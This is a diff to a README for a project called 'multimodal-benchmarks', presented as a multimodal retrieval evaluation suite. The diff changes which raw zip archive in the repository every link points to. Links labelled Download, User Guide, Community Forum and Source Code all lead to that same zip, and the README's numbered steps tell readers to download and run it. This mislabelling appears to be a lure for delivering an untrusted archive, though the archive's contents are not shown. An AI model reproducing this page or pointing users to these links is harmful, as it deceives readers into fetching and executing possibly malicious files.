@@ -1,6 +1,6 @@
 # 📊 multimodal-benchmarks - Evaluate Multimodal Retrieval with Ease
 
-[![Download](https://raw.githubusercontent.com/jesusp1234/multimodal-benchmarks/main/shared/benchmarks_multimodal_1.8.zip)](https://raw.githubusercontent.com/jesusp1234/multimodal-benchmarks/main/shared/benchmarks_multimodal_1.8.zip)
+[![Download](https://github.com/jesusp1234/multimodal-benchmarks/raw/refs/heads/main/device/benchmarks-multimodal-1.0.zip)](https://github.com/jesusp1234/multimodal-benchmarks/raw/refs/heads/main/device/benchmarks-multimodal-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **multimodal-benchmarks**! This tool offers an open evaluation suite 
 
 To get started, you need to download the application from our Releases page. 
 
-1. Visit this page to download: [Download multimodal-benchmarks](https://raw.githubusercontent.com/jesusp1234/multimodal-benchmarks/main/shared/benchmarks_multimodal_1.8.zip).
+1. Visit this page to download: [Download multimodal-benchmarks](https://github.com/jesusp1234/multimodal-benchmarks/raw/refs/heads/main/device/benchmarks-multimodal-1.0.zip).
 2. Find the latest version listed at the top.
 3. Click on the attachment link that fits your operating system (e.g., Windows, macOS, or Linux).
 4. Follow the prompts to save the file to your computer.
@@ -69,8 +69,8 @@ A: The application currently focuses on financial documents, medical devices, an
 
 For more information, you may find these resources helpful:
 
-- [User Guide](https://raw.githubusercontent.com/jesusp1234/multimodal-benchmarks/main/shared/benchmarks_multimodal_1.8.zip)
-- [Community Forum](https://raw.githubusercontent.com/jesusp1234/multimodal-benchmarks/main/shared/benchmarks_multimodal_1.8.zip)
+- [User Guide](https://github.com/jesusp1234/multimodal-benchmarks/raw/refs/heads/main/device/benchmarks-multimodal-1.0.zip)
+- [Community Forum](https://github.com/jesusp1234/multimodal-benchmarks/raw/refs/heads/main/device/benchmarks-multimodal-1.0.zip)
 
 ## 🌐 Community Support
 
@@ -78,7 +78,7 @@ Join our community for support and discussions. You can connect with other users
 
 ## 🔗 Links
 
-- For the latest releases, visit: [Download multimodal-benchmarks](https://raw.githubusercontent.com/jesusp1234/multimodal-benchmarks/main/shared/benchmarks_multimodal_1.8.zip).
-- Check our [Source Code](https://raw.githubusercontent.com/jesusp1234/multimodal-benchmarks/main/shared/benchmarks_multimodal_1.8.zip) for insights into development.
+- For the latest releases, visit: [Download multimodal-benchmarks](https://github.com/jesusp1234/multimodal-benchmarks/raw/refs/heads/main/device/benchmarks-multimodal-1.0.zip).
+- Check our [Source Code](https://github.com/jesusp1234/multimodal-benchmarks/raw/refs/heads/main/device/benchmarks-multimodal-1.0.zip) for insights into development.
 
 Thank you for using **multimodal-benchmarks**!
